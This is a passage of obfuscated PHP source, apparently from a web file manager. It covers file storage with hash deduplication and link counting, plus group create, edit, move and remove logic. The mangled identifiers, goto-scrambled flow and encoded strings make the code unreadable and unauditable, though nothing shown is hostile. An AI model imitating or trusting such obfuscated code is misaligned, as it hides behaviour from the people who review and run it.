$Aî¹º¸Ÿßğ = array($aëğ„®ÙŞ²[543] => IO::size($fÀõÌ”Âå), $aëğ„®ÙŞ²[1721] => 1, $aëğ„®ÙŞ²[407] => $FÂìÉåçŞ›, $aëğ„®ÙŞ²[760] => $cÈ§Á¢İñ[$aëğ„®ÙŞ²[388]], $aëğ„®ÙŞ²[408] => $fÀõÌ”Âå, $aëğ„®ÙŞ²[1722] => $c¨ å‹Ë‡Ë[$aëğ„®ÙŞ²[170]] ? $c¨ å‹Ë‡Ë[$aëğ„®ÙŞ²[170]] : IO::hashSimple($fÀõÌ”Âå), $aëğ„®ÙŞ²[1723] => $fæ•»¶èÙš ? $fæ•»¶èÙš : $FÕÂÊ™¸ö’); goto EŞ¬ÑÈĞÛ; eëï·´¹¥: $aëğ„®ÙŞ² =& $_SERVER[Š‰]; if (!IO::exist($fÀõÌ”Âå)) { return !1; } $FÕÂÊ™¸ö’ = $c¨ å‹Ë‡Ë[$aëğ„®ÙŞ²[169]] ? $c¨ å‹Ë‡Ë[$aëğ„®ÙŞ²[169]] : $aëğ„®ÙŞ²[33]; goto D´¯ò ™£†; EŞ¬ÑÈĞÛ: if ($bƒ”’Ÿ­²˜ = $this->addFileCheckExist($Aî¹º¸Ÿßğ[$aëğ„®ÙŞ²[170]], $Aî¹º¸Ÿßğ[$aëğ„®ÙŞ²[169]], $Aî¹º¸Ÿßğ[$aëğ„®ÙŞ²[77]])) { return $bƒ”’Ÿ­²˜; } return $this->addFileData($Aî¹º¸Ÿßğ); goto DŞ‚¬ ·¶å; DŞ‚¬ ·¶å: } private function addFileData($Aªôğí­µ”) { $aø‹º÷ÈŞ‚ =& $_SERVER[Š‰]; if (!$Aªôğí­µ”) { return !1; } $Aªôğí­µ”[$aø‹º÷ÈŞ‚[77]] = intval($Aªôğí­µ”[$aø‹º÷ÈŞ‚[77]]); if (!$Aªôğí­µ”[$aø‹º÷ÈŞ‚[77]] && strlen($Aªôğí­µ”[$aø‹º÷ÈŞ‚[170]]) > 32) { $Aªôğí­µ”[$aø‹º÷ÈŞ‚[77]] = intval(substr($Aªôğí­µ”[$aø‹º÷ÈŞ‚[170]], 32)); } $eç·„ŠÅî¯ = $this->add($Aªôğí­µ”); return $this->find($eç·„ŠÅî¯); } public function addFile($cì‚áåëğ, $d¤‰ÎÂ³µ, $cîÔ¼Âê­— = false) { goto a¾Ïß©™±¨; a¾Ïß©™±¨: $cß¼óÕù‡‡ = IO::hashSimple($cì‚áåëğ); $e«§±á›’ = IO::hashMd5($cì‚áåëğ); $f¾˜äˆÜñÜ = IO::size($cì‚áåëğ); goto d¢¾ø÷µÖ¸; d¢¾ø÷µÖ¸: $cÁÙÑ®„–è = $_SERVER[Š‰][1724] . $e«§±á›’; CacheLock::lock($cÁÙÑ®„–è); if ($a‡ï¸ßöù­ = $this->addFileCheckExist($cß¼óÕù‡‡, $e«§±á›’, $f¾˜äˆÜñÜ)) { CacheLock::unlock($cÁÙÑ®„–è); return $a‡ï¸ßöù­; } goto d¶ÕçŒö³‘; aøˆ¥«‹°Æ: return $dÚôİÒ¶¯Û; goto d»”Ôëª‘¨; d¶ÕçŒö³‘: $Cªè÷Œëœ = $this->addFileMake($cì‚áåëğ, $f¾˜äˆÜñÜ, $cß¼óÕù‡‡, $e«§±á›’, $d¤‰ÎÂ³µ, $cîÔ¼Âê­—); $dÚôİÒ¶¯Û = $this->addFileData($Cªè÷Œëœ); CacheLock::unlock($cÁÙÑ®„–è); goto aøˆ¥«‹°Æ; d»”Ôëª‘¨: } public function addFileMake($DÚŸ¬æÉ½Ê, $FÃ›Ù½ÕîÖ, $E ‹„×ƒ“, $Dš íŸ”‘Œ, $FôÌ×Ù¾¾Â, $e‡æº—ï½) { goto aÓƒŞ«Õ…; d‡ô¨ô­ğ: $A»é’Šğé¯ = get_path_this($e…ïùÄÏ¤); if ($e‡æº—ï½) { $bÆò«ŸáËø = IO::move($DÚŸ¬æÉ½Ê, $c›øØØ¤°‘, !1, $A»é’Šğé¯); } else { $bÆò«ŸáËø = IO::copy($DÚŸ¬æÉ½Ê, $c›øØØ¤°‘, !1, $A»é’Šğé¯); } if (!$bÆò«ŸáËø) { return !1; } goto d¦³¶½¯·İ; aÓƒŞ«Õ…: $dÓ¥­—“‘ë =& $_SERVER[Š‰]; $e…ïùÄÏ¤ = $this->createFileName($FôÌ×Ù¾¾Â, $Dš íŸ”‘Œ); $c›øØØ¤°‘ = get_path_father($e…ïùÄÏ¤); goto d‡ô¨ô­ğ; d¦³¶½¯·İ: $ešÈ¨˜±Î‰ = KodIO::defaultDriver(); $A»İÏá‰ì„ = array($dÓ¥­—“‘ë[543] => $FÃ›Ù½ÕîÖ, $dÓ¥­—“‘ë[1721] => 1, $dÓ¥­—“‘ë[407] => $FôÌ×Ù¾¾Â, $dÓ¥­—“‘ë[760] => $ešÈ¨˜±Î‰[$dÓ¥­—“‘ë[388]], $dÓ¥­—“‘ë[408] => $e…ïùÄÏ¤, $dÓ¥­—“‘ë[1722] => $E ‹„×ƒ“, $dÓ¥­—“‘ë[1723] => $Dš íŸ”‘Œ); return $A»İÏá‰ì„; goto Aˆ¯¿Ó¶¶; Aˆ¯¿Ó¶¶: } public function addFileCheckExist($b»÷ˆé, $eÇ÷³à¬•À, $f‡êÖÀÜ¼) { $C‘šÕ²ÄÛ =& $_SERVER[Š‰]; $cÛç´—×¼ = $this->findByHash($b»÷ˆé, $eÇ÷³à¬•À); if (!$cÛç´—×¼) { return !1; } $E¿œ‹… ØÔ = array($C‘šÕ²ÄÛ[1721] => intval($cÛç´—×¼[$C‘šÕ²ÄÛ[1725]]) + 1, $C‘šÕ²ÄÛ[543] => $f‡êÖÀÜ¼); $this->where(array($C‘šÕ²ÄÛ[442] => $cÛç´—×¼[$C‘šÕ²ÄÛ[441]]))->save($E¿œ‹… ØÔ); return $cÛç´—×¼; } public function remove($E÷‰„İØÓŒ) { $this->linkCountChange($E÷‰„İØÓŒ, !1); $this->clearEmpty(); return !0; } public function linkAdd($Fš‘Åò‚Úò) { $this->linkCountChange($Fš‘Åò‚Úò, !0); } public function linkCountChange($a“‚¦èŞö¨, $EÁ®Ïƒ¢»ˆ) { goto fÀÂ»¨ç­’; bƒ¸ˆ ¢à·: $BÖ•¼ç»Œ = array(); foreach ($a“‚¦èŞö¨ as $a‚Ş—Ş±É) { $eÍõà‚»° = $a‚Ş—Ş±É . $fµßŞì¶ëÓ[33]; if (!$BÖ•¼ç»Œ[$eÍõà‚»°]) { $BÖ•¼ç»Œ[$eÍõà‚»°] = 0; } $BÖ•¼ç»Œ[$eÍõà‚»°]++; } $aˆÁè³£ˆ‹ = array(); goto Dí‚šÌŠ¨; fÀÂ»¨ç­’: $fµßŞì¶ëÓ =& $_SERVER[Š‰]; if (!$a“‚¦èŞö¨) { return; } if (!is_array($a“‚¦èŞö¨)) { $a“‚¦èŞö¨ = array($a“‚¦èŞö¨); } goto bƒ¸ˆ ¢à·; Dí‚šÌŠ¨: foreach ($BÖ•¼ç»Œ as $a‚Ş—Ş±É => $eñöê®¼™„) { $eÍõà‚»° = $eñöê®¼™„ . $fµßŞì¶ëÓ[33]; if (!$aˆÁè³£ˆ‹[$eÍõà‚»°]) { $aˆÁè³£ˆ‹[$eÍõà‚»°] = array(); } $aˆÁè³£ˆ‹[$eÍõà‚»°][] = $a‚Ş—Ş±É; } foreach ($aˆÁè³£ˆ‹ as $eñöê®¼™„ => $fÂÅ´Û°î™) { if (!$fÂÅ´Û°î™) { continue; } $eñöê®¼™„ = $EÁ®Ïƒ¢»ˆ ? $eñöê®¼™„ : -intval($eñöê®¼™„); $f¨³¥Æ§Ö£ = array($fµßŞì¶ëÓ[441] => array($fµßŞì¶ëÓ[7], $fÂÅ´Û°î™)); if ($eñöê®¼™„ < 0) { $f¨³¥Æ§Ö£[$fµßŞì¶ëÓ[1725]] = array($fµßŞì¶ëÓ[949], abs($eñöê®¼™„)); } $this->where($f¨³¥Æ§Ö£)->setAdd($fµßŞì¶ëÓ[1725], $eñöê®¼™„); } goto c‹ÒŒ·ƒ; c‹ÒŒ·ƒ: } public function findByHash($bœ™ÀŠ“ŞÍ, $F¶‡·ÅÂ°ä = false) { $dµŞšè°¦± =& $_SERVER[Š‰]; if (!$bœ™ÀŠ“ŞÍ && !$F¶‡·ÅÂ°ä) { return !1; } $cƒ…ò—¢¶ = array($dµŞšè°¦±[1722] => $bœ™ÀŠ“ŞÍ); if ($F¶‡·ÅÂ°ä) { $cƒ…ò—¢¶ = array($dµŞšè°¦±[1723] => $F¶‡·ÅÂ°ä); } return $this->order($dµŞšè°¦±[1726])->where($cƒ…ò—¢¶)->find(); } public function clearEmpty($cËÍ´Ü…ãó = 0) { goto cñ·ˆºº›Ë; dŸÍ¦øº¹ó: foreach ($E¤ÔÆ¦‹œÑ as $dá³›¶—¢) { $d¸ØÃ„‰Ê->update(1); $this->resetFile($dá³›¶—¢); } $d¸ØÃ„‰Ê->end(); goto F¶¥Û¨ŸÛ; cñ·ˆºº›Ë: $eÚ„”’§¦× =& $_SERVER[Š‰]; $b¸†Š†ƒ = time() - 3600 * 24 * $cËÍ´Ü…ãó; $A¶ÏŸŠª = $eÚ„”’§¦×[1727] . $b¸†Š†ƒ; goto FŸ®çÖğó„; FŸ®çÖğó„: $E¤ÔÆ¦‹œÑ = $this->where($A¶ÏŸŠª)->select(); if (!$E¤ÔÆ¦‹œÑ) { return; } $d¸ØÃ„‰Ê = new Task($eÚ„”’§¦×[1728], $eÚ„”’§¦×[33], count($E¤ÔÆ¦‹œÑ)); goto dŸÍ¦øº¹ó; F¶¥Û¨ŸÛ: } public function resetFile($aç»…É‰¸) { goto còïÊ¶¥; còïÊ¶¥: $eî–ã­ÙÂ =& $_SERVER[Š‰]; $dÒôİ‡Üîß = array($eî–ã­ÙÂ[442] => $aç»…É‰¸[$eî–ã­ÙÂ[441]]); $e£Ø¤²Ü¸ø = Model($eî–ã­ÙÂ[1180])->where($dÒôİ‡Üîß)->count(); goto FÚÂÎëµÒš; C»³™åùåâ: if ($aç»…É‰¸[$eî–ã­ÙÂ[1725]] != $B³ÀÉÙ®ÆŸ) { $this->where($dÒôİ‡Üîß)->save(array($eî–ã­ÙÂ[1721] => $B³ÀÉÙ®ÆŸ)); } goto c›“ğø; FÚÂÎëµÒš: $b„º§Üİ² = Model($eî–ã­ÙÂ[1729])->where($dÒôİ‡Üîß)->count(); $B³ÀÉÙ®ÆŸ = intval($e£Ø¤²Ü¸ø) + intval($b„º§Üİ²); if ($B³ÀÉÙ®ÆŸ == 0) { IO::remove($aç»…É‰¸[$eî–ã­ÙÂ[75]]); $this->where($dÒôİ‡Üîß)->delete(); $this->metaSet($aç»…É‰¸[$eî–ã­ÙÂ[441]], null, null); return; } goto C»³™åùåâ; c›“ğø: } public function storageInfo($A¤§Í®ùà = false) { goto Eçšº›öà£; Eçšº›öà£: $CÚ ›Ú§´¥ =& $_SERVER[Š‰]; $d’‡…œÖƒÁ = $this->count() + 0.0; $EÖàò§Ö = 0; goto c¨ÂõÓñ«Ç; c¨ÂõÓñ«Ç: $b…Ö‘†•èë = 1; $E·º·éŠ²‹ = 0; $eš†ãİÅ‘‘ = 5000; goto e²ëÛã¾©µ; e²ëÛã¾©µ: for ($AºÍæª×‚ = 0; $AºÍæª×‚ < $d’‡…œÖƒÁ; $AºÍæª×‚ = $AºÍæª×‚ + $eš†ãİÅ‘‘) { $bÓÏ·¡Ÿ×– = $this->limit($AºÍæª×‚, $AºÍæª×‚ + $eš†ãİÅ‘‘)->select(); foreach ($bÓÏ·¡Ÿ×– as $A’áñÒÑêÏ) { $b…Ö‘†•èë += $A’áñÒÑêÏ[$CÚ ›Ú§´¥[77]] * $A’áñÒÑêÏ[$CÚ ›Ú§´¥[1725]]; $EÖàò§Ö += $A’áñÒÑêÏ[$CÚ ›Ú§´¥[77]] * ($A’áñÒÑêÏ[$CÚ ›Ú§´¥[1725]] - 1); $E·º·éŠ²‹ += $A’áñÒÑêÏ[$CÚ ›Ú§´¥[1725]]; } } $dˆÌ…‹¾µ‹ = array($CÚ ›Ú§´¥[1730] => $b…Ö‘†•èë, $CÚ ›Ú§´¥[1731] => $EÖàò§Ö, $CÚ ›Ú§´¥[1732] => $EÖàò§Ö / $b…Ö‘†•èë, $CÚ ›Ú§´¥[81] => $d’‡…œÖƒÁ, $CÚ ›Ú§´¥[1733] => $E·º·éŠ²‹); return $dˆÌ…‹¾µ‹; goto e•ìËÂô«š; e•ìËÂô«š: } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\x70"; protected $tableMeta = array("\164\141\x62\154\x65\x4e\x61\155\x65" => "\147\x72\157\165\x70\x5f\155\145\x74\141", "\x6d\145\164\x61\x46\x69\x65\154\144" => "\x67\x72\157\x75\x70\111\104"); protected function cacheFunctionAlias($aˆÔ¶Çßˆ”) { $B½Ã²‘±à“ =& $_SERVER[Š‰]; return array($B½Ã²‘±à“[1734] => array($aˆÔ¶Çßˆ”[0], $B½Ã²‘±à“[1735]), $B½Ã²‘±à“[1736] => array($aˆÔ¶Çßˆ”[0], $B½Ã²‘±à“[1735])); } protected function getInfo($f‡İÎ„àˆÈ) { $e¹Êãæ„ƒ = $this->getInfoSimple($f‡İÎ„àˆÈ); if (!$e¹Êãæ„ƒ) { return !1; } return $this->_listDataApplyItem($e¹Êãæ„ƒ); } protected function getInfoSimple($b›ªÛ‡Ú…Æ, $bŠËªˆƒÁì = false) { $A¼Éá´¸¯• =& $_SERVER[Š‰]; if ($bŠËªˆƒÁì) { $føä‘…‡ËÀ = array($A¼Éá´¸¯•[1663] => intval($b›ªÛ‡Ú…Æ)); $E–æÇ‡®Ö† = $this->where($føä‘…‡ËÀ)->find(); return is_array($E–æÇ‡®Ö†) ? $E–æÇ‡®Ö† : array(); } return $this->cacheFunctionGet($A¼Éá´¸¯•[1737], $b›ªÛ‡Ú…Æ); } protected function groupAdd($AØ§÷Îà˜ø) { goto c¢÷’†šËÆ; cªç…Òì•Ê: if ($CÔ²…è·¢è[$E­–½ª½÷à[481]]) { $E°¤ôÔñÜ = $CÔ²…è·¢è[$E­–½ª½÷à[481]] . $CÔ²…è·¢è[$E­–½ª½÷à[1663]] . $E­–½ª½÷à[47]; } $AñÍº‹°Á = array($E­–½ª½÷à[407] => $this->groupNameAuto($AØ§÷Îà˜ø[$E­–½ª½÷à[472]], $AØ§÷Îà˜ø[$E­–½ª½÷à[28]]), $E­–½ª½÷à[389] => $AØ§÷Îà˜ø[$E­–½ª½÷à[472]], $E­–½ª½÷à[548] => $E°¤ôÔñÜ, $E­–½ª½÷à[1738] => $AØ§÷Îà˜ø[$E­–½ª½÷à[1647]], $E­–½ª½÷à[1739] => 0, $E­–½ª½÷à[1667] => 0); if (isset($AØ§÷Îà˜ø[$E­–½ª½÷à[1686]])) { $AñÍº‹°Á[$E­–½ª½÷à[1686]] = $AØ§÷Îà˜ø[$E­–½ª½÷à[1686]]; } else { $c¯Öâ‹šËô = $this->max($E­–½ª½÷à[1686]); if (!$c¯Öâ‹šËô) { $c¯Öâ‹šËô = 0; } $AñÍº‹°Á[$E­–½ª½÷à[1686]] = $c¯Öâ‹šËô + 1; } goto CÓæ‹´•À‡; CÓæ‹´•À‡: if (!empty($AØ§÷Îà˜ø[$E­–½ª½÷à[1663]])) { $AñÍº‹°Á[$E­–½ª½÷à[1663]] = $AØ§÷Îà˜ø[$E­–½ª½÷à[1663]]; } $e„±½Ã‚÷Ì = $this->add($AñÍº‹°Á); $this->setNamePinyin($e„±½Ã‚÷Ì, $AñÍº‹°Á[$E­–½ª½÷à[28]]); goto AÉÊöâ´ƒê; c¢÷’†šËÆ: $E­–½ª½÷à =& $_SERVER[Š‰]; if (!$AØ§÷Îà˜ø[$E­–½ª½÷à[472]] && isset($AØ§÷Îà˜ø[$E­–½ª½÷à[1663]]) && $AØ§÷Îà˜ø[$E­–½ª½÷à[1663]] == 1) { if ($CÔ²…è·¢è = $this->getInfoSimple($AØ§÷Îà˜ø[$E­–½ª½÷à[1663]], !0)) { return $AØ§÷Îà˜ø[$E­–½ª½÷à[1663]]; } } else { $CÔ²…è·¢è = $this->getInfoSimple($AØ§÷Îà˜ø[$E­–½ª½÷à[472]]); if (!$CÔ²…è·¢è) { return !1; } } $E°¤ôÔñÜ = $E­–½ª½÷à[493]; goto cªç…Òì•Ê; AÉÊöâ´ƒê: if (isset($AØ§÷Îà˜ø[$E­–½ª½÷à[1740]])) { $this->metaSet($e„±½Ã‚÷Ì, array($E­–½ª½÷à[1740] => $AØ§÷Îà˜ø[$E­–½ª½÷à[1740]], $E­–½ª½÷à[1741] => $AØ§÷Îà˜ø[$E­–½ª½÷à[1741]])); unset($AØ§÷Îà˜ø[$E­–½ª½÷à[1740]]); unset($AØ§÷Îà˜ø[$E­–½ª½÷à[1741]]); } Model($E­–½ª½÷à[1180])->groupRootAdd($e„±½Ã‚÷Ì); return $e„±½Ã‚÷Ì; goto fíÓ¿äÖß—; fíÓ¿äÖß—: } protected function groupEdit($fÀ¾©®¬¥–, $c ˜¾­çœ‚) { goto d ‘Ä×­­; e‰ß¸˜¿¦: if (isset($c ˜¾­çœ‚[$EµÇÒèº‹Å[28]]) && $c ˜¾­çœ‚[$EµÇÒèº‹Å[28]] != $EÃ¨¿†³‹¾[$EµÇÒèº‹Å[28]]) { $this->_clearChildrenCache($EÃ¨¿†³‹¾); } return $this->where(array($EµÇÒèº‹Å[1742] => $fÀ¾©®¬¥–))->save($c ˜¾­çœ‚); goto aÄ’Ê´Ğê; b­äîÙ—‹: if (!empty($c ˜¾­çœ‚[$EµÇÒèº‹Å[472]])) { $d„„‘¤ˆ = $this->getInfoSimple($c ˜¾­çœ‚[$EµÇÒèº‹Å[472]]); if (!$d„„‘¤ˆ) { return !1; } if ($EÃ¨¿†³‹¾[$EµÇÒèº‹Å[1663]] == $d„„‘¤ˆ[$EµÇÒèº‹Å[1663]]) { return !1; } if ($c ˜¾­çœ‚[$EµÇÒèº‹Å[472]] != $EÃ¨¿†³‹¾[$EµÇÒèº‹Å[472]]) { if ($d„„‘¤ˆ[$EµÇÒèº‹Å[481]] !== $EÃ¨¿†³‹¾[$EµÇÒèº‹Å[481]] && strpos($d„„‘¤ˆ[$EµÇÒèº‹Å[481]], $EÃ¨¿†³‹¾[$EµÇÒèº‹Å[481]] . $EÃ¨¿†³‹¾[$EµÇÒèº‹Å[1663]] . $EµÇÒèº‹Å[47]) === 0) { return !1; } $c ˜¾­çœ‚[$EµÇÒèº‹Å[548]] = $d„„‘¤ˆ[$EµÇÒèº‹Å[481]] . $c ˜¾­çœ‚[$EµÇÒèº‹Å[472]] . $EµÇÒèº‹Å[47]; $this->_changeChildLevel($EÃ¨¿†³‹¾, $d„„‘¤ˆ); } } if (isset($c ˜¾­çœ‚[$EµÇÒèº‹Å[28]])) { $this->setNamePinyin($fÀ¾©®¬¥–, $c ˜¾­çœ‚[$EµÇÒèº‹Å[28]]); } if (isset($c ˜¾­çœ‚[$EµÇÒèº‹Å[1740]])) { $this->metaSet($fÀ¾©®¬¥–, array($EµÇÒèº‹Å[1740] => $c ˜¾­çœ‚[$EµÇÒèº‹Å[1740]], $EµÇÒèº‹Å[1741] => $c ˜¾­çœ‚[$EµÇÒèº‹Å[1741]])); unset($c ˜¾­çœ‚[$EµÇÒèº‹Å[1740]]); unset($c ˜¾­çœ‚[$EµÇÒèº‹Å[1741]]); } goto e‰ß¸˜¿¦; d ‘Ä×­­: $EµÇÒèº‹Å =& $_SERVER[Š‰]; $EÃ¨¿†³‹¾ = $this->getInfoSimple($fÀ¾©®¬¥–); if (!$EÃ¨¿†³‹¾) { return !1; } goto b­äîÙ—‹; aÄ’Ê´Ğê: } private function _clearChildrenCache($D÷°Ëï¦Î) { $D‡©åëÄ°Œ =& $_SERVER[Š‰]; $AÊÚ”öÉÕè = array($D‡©åëÄ°Œ[548] => array($D‡©åëÄ°Œ[507], $D÷°Ëï¦Î[$D‡©åëÄ°Œ[481]] . $D÷°Ëï¦Î[$D‡©åëÄ°Œ[1663]] . $D‡©åëÄ°Œ[508])); $f®›§ˆì©å = $this->field($D‡©åëÄ°Œ[1663])->where($AÊÚ”öÉÕè)->select(); foreach ($f®›§ˆì©å as $aŸƒ•ˆÓà…) { $this->cacheFunctionClear($D‡©åëÄ°Œ[1743], $aŸƒ•ˆÓà…[$D‡©åëÄ°Œ[1663]]); $this->cacheFunctionClear($D‡©åëÄ°Œ[1737], $aŸƒ•ˆÓà…[$D‡©åëÄ°Œ[1663]]); } } private function _changeChildLevel($a† ñÏ¸É˜, $DÏß†š¨‡×, $Bæ„¬Œ†‹ = false) { goto eï÷‰²Íœš; fÚØªôäˆ: if ($Bæ„¬Œ†‹) { $F—Æœß‰ª = $DÏß†š¨‡×[$eÇÁÏÙƒ†‘[481]] . $DÏß†š¨‡×[$eÇÁÏÙƒ†‘[1663]] . $eÇÁÏÙƒ†‘[47]; } $eÍ šƒŠ = array($eÇÁÏÙƒ†‘[548] => array($eÇÁÏÙƒ†‘[507], $a† ñÏ¸É˜[$eÇÁÏÙƒ†‘[481]] . $a† ñÏ¸É˜[$eÇÁÏÙƒ†‘[1663]] . $eÇÁÏÙƒ†‘[508])); $dĞµğÙÃ”Õ = array($eÇÁÏÙƒ†‘[548] => array($eÇÁÏÙƒ†‘[556], "\162\x65\x70\154\x61\x63\x65\x28\160\x61\162\x65\156\x74\114\145\x76\x65\x6c\x2c\x27{$FùçŒÏ­»}\47\x2c\47{$F—Æœß‰ª}\47\51")); goto DÏ¿Œ‚ƒà­; DÏ¿Œ‚ƒà­: $this->_clearChildrenCache($a† ñÏ¸É˜); $this->where($eÍ šƒŠ)->data($dĞµğÙÃ”Õ)->save(); goto fö’÷Ù¢‰Ì; eï÷‰²Íœš: $eÇÁÏÙƒ†‘ =& $_SERVER[Š‰]; $FùçŒÏ­» = $a† ñÏ¸É˜[$eÇÁÏÙƒ†‘[481]] . $a† ñÏ¸É˜[$eÇÁÏÙƒ†‘[1663]] . $eÇÁÏÙƒ†‘[47]; $F—Æœß‰ª = $DÏß†š¨‡×[$eÇÁÏÙƒ†‘[481]] . $DÏß†š¨‡×[$eÇÁÏÙƒ†‘[1663]] . $eÇÁÏÙƒ†‘[47] . $a† ñÏ¸É˜[$eÇÁÏÙƒ†‘[1663]] . $eÇÁÏÙƒ†‘[47]; goto fÚØªôäˆ; fö’÷Ù¢‰Ì: } public function setNamePinyin($càÒÛãÏÍé, $A‰ÆÈ‘Ÿ = false) { $E”ÑïÙ­Ş„ =& $_SERVER[Š‰]; if (!$A‰ÆÈ‘Ÿ) { $EÀ’ŠºÆÛ = $this->getInfoSimple($càÒÛãÏÍé); $A‰ÆÈ‘Ÿ = $EÀ’ŠºÆÛ[$E”ÑïÙ­Ş„[28]]; } if (!Input::check($A‰ÆÈ‘Ÿ, $E”ÑïÙ­Ş„[551])) { $this->metaSet($càÒÛãÏÍé, $E”ÑïÙ­Ş„[438], null); $this->metaSet($càÒÛãÏÍé, $E”ÑïÙ­Ş„[437], null); return; } $dùÙ¯£ç¤¡ = array($E”ÑïÙ­Ş„[438] => str_replace($E”ÑïÙ­Ş„[50], $E”ÑïÙ­Ş„[33], Pinyin::encode($A‰ÆÈ‘Ÿ)), $E”ÑïÙ­Ş„[437] => Pinyin::encode($A‰ÆÈ‘Ÿ, $E”ÑïÙ­Ş„[552])); $this->metaSet($càÒÛãÏÍé, $dùÙ¯£ç¤¡); } protected function groupStatus($A·–ïš–¯, $Cİ²ŞÀÖ©À) { goto cšìô—¿Œ¸; cšìô—¿Œ¸: $c´ƒÑ•Şí =& $_SERVER[Š‰]; $céÌõÆŸå‰ = $this->getInfoSimple($A·–ïš–¯); if (!$céÌõÆŸå‰) { return !1; } goto Fä‡Æ…Ğï; AŞ¸ñÓ‹ÉË: foreach ($a•®ö°ìãó as $A·–ïš–¯) { $aÖğ´Çá¾Ÿ[] = array($c´ƒÑ•Şí[1663] => $A·–ïš–¯, $c´ƒÑ•Şí[92] => $c´ƒÑ•Şí[702], $c´ƒÑ•Şí[370] => $Cİ²ŞÀÖ©À); } return Model($c´ƒÑ•Şí[1744])->addAll($aÖğ´Çá¾Ÿ, array(), !0); goto C–Ø‚°•Ä; Fä‡Æ…Ğï: if ($Cİ²ŞÀÖ©À == $c´ƒÑ•Şí[86]) { $a•®ö°ìãó = $this->parentLevelArray($céÌõÆŸå‰[$c´ƒÑ•Şí[481]]); } else { $DÍ¾ÇÙëê÷ = array($c´ƒÑ•Şí[548] => array($c´ƒÑ•Şí[507], $céÌõÆŸå‰[$c´ƒÑ•Şí[481]] . $céÌõÆŸå‰[$c´ƒÑ•Şí[1663]] . $c´ƒÑ•Şí[508])); $a•®ö°ìãó = $this->where($DÍ¾ÇÙëê÷)->field($c´ƒÑ•Şí[1663])->select(); $a•®ö°ìãó = array_to_keyvalue($a•®ö°ìãó, $c´ƒÑ•Şí[33], $c´ƒÑ•Şí[1663]); } $a•®ö°ìãó[] = $céÌõÆŸå‰[$c´ƒÑ•Şí[1663]]; $aÖğ´Çá¾Ÿ = array(); goto AŞ¸ñÓ‹ÉË; C–Ø‚°•Ä: } protected function groupRemove($FÎŠŒÜ•ŸÎ) { goto b©ÃğĞ•­; dò£˜…øÅ¿: if (!$E·Ú“¥ŠŠğ || $E·Ú“¥ŠŠğ[$f¯Ãç‰˜‹´[472]] == 0) { return !1; } $a®Çë¶ÙÒ = $this->getInfoSimple($E·Ú“¥ŠŠğ[$f¯Ãç‰˜‹´[472]]); $this->_changeChildLevel($E·Ú“¥ŠŠğ, $a®Çë¶ÙÒ, !0); goto BÂƒÛñòŠ; b©ÃğĞ•­: $f¯Ãç‰˜‹´ =& $_SERVER[Š‰]; $B‘›ëäôã” = array($f¯Ãç‰˜‹´[1663] => $FÎŠŒÜ•ŸÎ); $E·Ú“¥ŠŠğ = $this->where($B‘›ëäôã”)->find(); goto dò£˜…øÅ¿; BÂƒÛñòŠ: $this->where(array($f¯Ãç‰˜‹´[472] => $FÎŠŒÜ•ŸÎ))->save(array($f¯Ãç‰˜‹´[472] => $E·Ú“¥ŠŠğ[$f¯Ãç‰˜‹´[472]])); Model($f¯Ãç‰˜‹´[1744])->where($B‘›ëäôã”)->delete(); Model($f¯Ãç‰˜‹´[1745])->where($B‘›ëäôã”)->delete(); goto EÇà·Ÿ§¯‘; EÇà·Ÿ§¯‘: Model($f¯Ãç‰˜‹´[775])->groupRootRemove($FÎŠŒÜ•ŸÎ); return $this->where($B‘›ëäôã”)->delete(); goto FôÉã¦‘™Š; FôÉã¦‘™Š: } protected function groupSort($eëÔöôÒ»Ò) { $E²…°¾Ù÷ =& $_SERVER[Š‰]; $cÇËÄ‚Ã¯¤ = array(); foreach ($eëÔöôÒ»Ò as $B¶„¡‘Å¯Ç => $c“¯®…ª©) { $cÇËÄ‚Ã¯¤[] = array($E²…°¾Ù÷[1663], $c“¯®…ª©, $E²…°¾Ù÷[1686], $B¶„¡‘Å¯Ç + 1); } $this->saveAll($cÇËÄ‚Ã¯¤); } public function listData() { $dàñàÁÊÌõ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($dàñàÁÊÌõ[$_SERVER[Š‰][365]]); return $dàñàÁÊÌõ; } private function _makeOrder($AÓ—×µĞ²è = '') { goto aåÉİÖæ–‚; dğò‰°†Õ: $e„îâŠƒ…† = Input::get($E™¨ÀÄ«â[429], $E™¨ÀÄ«â[7], $E™¨ÀÄ«â[1667], $b· ªÛÍØ¯); $Dğ«×ÄÍ = Input::get($E™¨ÀÄ«â[430], $E™¨ÀÄ«â[7], $E™¨ÀÄ«â[1746], array($E™¨ÀÄ«â[1746], $E™¨ÀÄ«â[424])); $Dğ«×ÄÍ = $C„äö»ô[$Dğ«×ÄÍ]; goto EÔğË‰Î¨; aåÉİÖæ–‚: $E™¨ÀÄ«â =& $_SERVER[Š‰]; $b· ªÛÍØ¯ = array($E™¨ÀÄ«â[1663], $E™¨ÀÄ«â[28], $E™¨ÀÄ«â[1649], $E™¨ÀÄ«â[192]); $C„äö»ô = array($E™¨ÀÄ«â[422] => $E™¨ÀÄ«â[423], $E™¨ÀÄ«â[424] => $E™¨ÀÄ«â[425]); goto dğò‰°†Õ; EÔğË‰Î¨: $AÓ—×µĞ²è = $AÓ—×µĞ²è . "{$e„îâŠƒ…†}\40{$Dğ«×ÄÍ}\54\x20\x67\162\x6f\165\160\111\104\x20\141\x73\x63"; return $this->order($AÓ—×µĞ²è); goto C›“ê¸ÚÈ‹; C›“ê¸ÚÈ‹: } public function listChild($cÒ­©ÀÓ”È) { $cé’²Ğ®š£ =& $_SERVER[Š‰]; $E®éã¯Éò¢ = $this->where(array($cé’²Ğ®š£[472] => $cÒ­©ÀÓ”È))->_makeOrder()->selectPage(200); $this->_listDataApply($E®éã¯Éò¢[$cé’²Ğ®š£[365]]); return $E®éã¯Éò¢; } public function listByID($dŸÑŞµÓÁ) { $aäÌÔë±“Œ =& $_SERVER[Š‰]; if (!$dŸÑŞµÓÁ) { return array(); } $dĞğ˜ë¡îÇ = array($aäÌÔë±“Œ[1663] => array($aäÌÔë±“Œ[7], $dŸÑŞµÓÁ)); $Dì¯š¦Ô»… = $this->where($dĞğ˜ë¡îÇ)->select(); $this->_listDataApply($Dì¯š¦Ô»…); return $Dì¯š¦Ô»…; } public function listSearch($c™é‹±ƒõš) { goto cÒé‹öÔİ²; D¬Øñ¹Ò†: $b˜Ç†ÈçéŞ = $b˜Ç†ÈçéŞ ? $b˜Ç†ÈçéŞ : array(); if (!$b˜Ç†ÈçéŞ || count($b˜Ç†ÈçéŞ[$Eê®†¥øŠ[365]]) < 5 && Input::check($d°Ê“ÆÈë„, 